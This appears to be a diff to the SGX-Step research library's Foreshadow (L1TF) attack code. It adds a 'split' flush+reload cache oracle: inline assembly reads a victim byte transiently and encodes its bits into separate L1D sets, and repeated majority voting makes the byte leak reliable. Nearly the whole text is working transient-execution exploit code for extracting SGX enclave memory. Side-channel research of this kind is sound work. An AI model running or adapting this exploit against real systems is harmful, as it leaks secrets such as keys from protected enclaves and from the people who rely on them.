@@ -1,0 +1,164 @@
+--- a/libsgxstep/foreshadow.c
++++ b/libsgxstep/foreshadow.c
+@@ -52,6 +52,118 @@
+ int  __attribute__((aligned(0x1000))) fs_dummy;
+ char __attribute__((aligned(0x1000))) fs_oracle[ORACLE_SIZE];
+ 
++/*
++ * -------------------------------------------------------------------------
++ * Split lo/hi oracle (FS_SPLIT_ORACLE=1).
++ *
++ * The default oracle above places all 256 slots at a 0x1000 stride, which on an
++ * L1D whose set index is (addr>>6)&(nsets-1) puts every slot in ONE set. Where
++ * flush+reload is set-scoped (measured on the i3-6100 lab host), that oracle
++ * cannot be decoded by a purely transient read: the reload scan of slots
++ * 0..secret-1 evicts slot[secret] before it is timed, so only small byte values
++ * survive and the enclave attack tops out near 10%.
++ *
++ * The split oracle gives every candidate CLASS its own L1D set (0x1040 stride)
++ * and decodes the byte as two independent traces -- the low six bits and the
++ * high two bits -- one candidate at a time (flush slot, one transient, reload
++ * slot). This is the geometry validated at 0/64 by app/foreshadow-leak.
++ *
++ * It requires the application's #PF handler to NOT re-present the page but to
++ * redirect RIP to fs_split_skip_to (set by the block below), so nothing is
++ * re-executed architecturally -- on a real enclave that would read the 0xff
++ * abort page. app/foreshadow's handler does this when fs_split is set.
++ * -------------------------------------------------------------------------
++ */
++#define FS_SPLIT_SLOT   0x1040
++#define FS_LO_CLASSES   64
++#define FS_HI_CLASSES   4
++
++int fs_split = 0;
++int fs_split_repeat = 5;         /* FS_SPLIT_REPEAT: majority vote per byte */
++void * volatile fs_split_skip_to = NULL;
++char __attribute__((aligned(0x1000))) fs_oracle_lo[FS_SPLIT_SLOT * FS_LO_CLASSES];
++char __attribute__((aligned(0x1000))) fs_oracle_hi[FS_SPLIT_SLOT * FS_HI_CLASSES];
++
++static inline void fs_leak_lo(void *base, void *adrs)
++{
++    asm volatile(
++        "   lea 2f(%%rip), %%rax\n\t"
++        "   mov %%rax, %0\n\t"
++        "1: movb (%1), %%al\n\t"
++        "   movzbl %%al, %%eax\n\t"
++        "   and $0x3f, %%eax\n\t"
++        "   imul %3, %%rax\n\t"
++        "   movq (%2, %%rax), %%rdi\n\t"
++        "2:\n\t"
++        : "=m"(fs_split_skip_to)
++        : "r"(adrs), "r"(base), "r"((unsigned long) FS_SPLIT_SLOT)
++        : "rax", "rdi", "memory");
++}
++
++static inline void fs_leak_hi(void *base, void *adrs)
++{
++    asm volatile(
++        "   lea 2f(%%rip), %%rax\n\t"
++        "   mov %%rax, %0\n\t"
++        "1: movb (%1), %%al\n\t"
++        "   movzbl %%al, %%eax\n\t"
++        "   shr $6, %%eax\n\t"
++        "   imul %3, %%rax\n\t"
++        "   movq (%2, %%rax), %%rdi\n\t"
++        "2:\n\t"
++        : "=m"(fs_split_skip_to)
++        : "r"(adrs), "r"(base), "r"((unsigned long) FS_SPLIT_SLOT)
++        : "rax", "rdi", "memory");
++}
++
++/* Decode one trace: warm the victim line, then for each candidate class flush
++ * its slot, run one transient, and time the slot. Returns the argmin class. */
++static int fs_decode_split(void *base, int classes, int high, void *adrs)
++{
++    int c, best = -1;
++    unsigned long t, b = ~0UL;
++
++    for (c = 0; c < classes; c++)
++    {
++        void *slot = (void *)((uint8_t *) base + (uint64_t) c * FS_SPLIT_SLOT);
++
++        if (fs_keep_warm_cb)
++            fs_keep_warm_cb();
++        flush(slot);
++        if (!fs_skip_transient)
++        {
++            if (high) fs_leak_hi(base, adrs);
++            else      fs_leak_lo(base, adrs);
++        }
++        t = reload(slot);
++        if (t < b) { b = t; best = c; }
++    }
++    return best;
++}
++
++static int foreshadow_round_split(void *adrs)
++{
++    int votes[256] = {0}, r, best = 0;
++
++    /*
++     * Repeat the (lo,hi) measurement and take the majority. A correct read is
++     * stable; the occasional wrong one (the victim line was evicted by the
++     * per-candidate re-warm's own overhead before the transient, so it leaked
++     * 0x00) is random, so the mode is the true byte -- the paper's repeated
++     * measurement, which lifts a ~99% single-shot read to a reliable 64/64.
++     */
++    for (r = 0; r < fs_split_repeat; r++)
++    {
++        int lo = fs_decode_split(fs_oracle_lo, FS_LO_CLASSES, 0, adrs);
++        int hi = fs_decode_split(fs_oracle_hi, FS_HI_CLASSES, 1, adrs);
++        int b = (lo < 0 || hi < 0) ? 0 : (((hi & 0x3) << 6) | (lo & 0x3f));
++        votes[b & 0xff]++;
++    }
++    for (r = 0; r < 256; r++)
++        if (votes[r] > votes[best]) best = r;
++    return best;
++}
++
+ void foreshadow_init(void)
+ {
+     unsigned long t1, t2;
+@@ -70,8 +182,23 @@
+             info("FS_SKIP_TRANSIENT: transient access disabled");
+     }
+ 
++    /* Split lo/hi oracle: one L1D set per candidate class. Requires the
++     * application's #PF handler to redirect RIP to fs_split_skip_to. */
++    {
++        const char *split = getenv("FS_SPLIT_ORACLE");
++        const char *rep = getenv("FS_SPLIT_REPEAT");
++        fs_split = (split && atoi(split) != 0);
++        if (rep && atoi(rep) > 0)
++            fs_split_repeat = atoi(rep);
++        if (fs_split)
++            info("FS_SPLIT_ORACLE: split lo(%d)/hi(%d) oracle, stride %#x, vote %d",
++                 FS_LO_CLASSES, FS_HI_CLASSES, FS_SPLIT_SLOT, fs_split_repeat);
++    }
++
+     /* ensure all oracle pages are mapped in */
+     memset(fs_oracle, 1, ORACLE_SIZE);
++    memset(fs_oracle_lo, 1, sizeof(fs_oracle_lo));
++    memset(fs_oracle_hi, 1, sizeof(fs_oracle_hi));
+ }
+ 
+ static inline int __attribute__((always_inline)) foreshadow_round(void *adrs)
+@@ -137,9 +264,17 @@
+ {
+     int j, rv = 0xff;
+ 
+-    if (!fs_reload_threshold) 
++    if (!fs_reload_threshold)
+         foreshadow_init();
+ 
++    /*
++     * Split lo/hi oracle: decodes the byte purely transiently on a set-scoped
++     * L1D, where the flat 256-slot oracle cannot be. It re-warms the victim line
++     * per candidate itself, so the zero-retry loop is not needed here.
++     */
++    if (fs_split)
++        return foreshadow_round_split(adrs);
++
+     /* Be sceptic about 0x00 bytes to compensate for the bias */
+     for(j=0; (rv==0x00 || rv==0xff) && j < fs_zero_retries_max; j++, fs_zero_retries++)
+     {
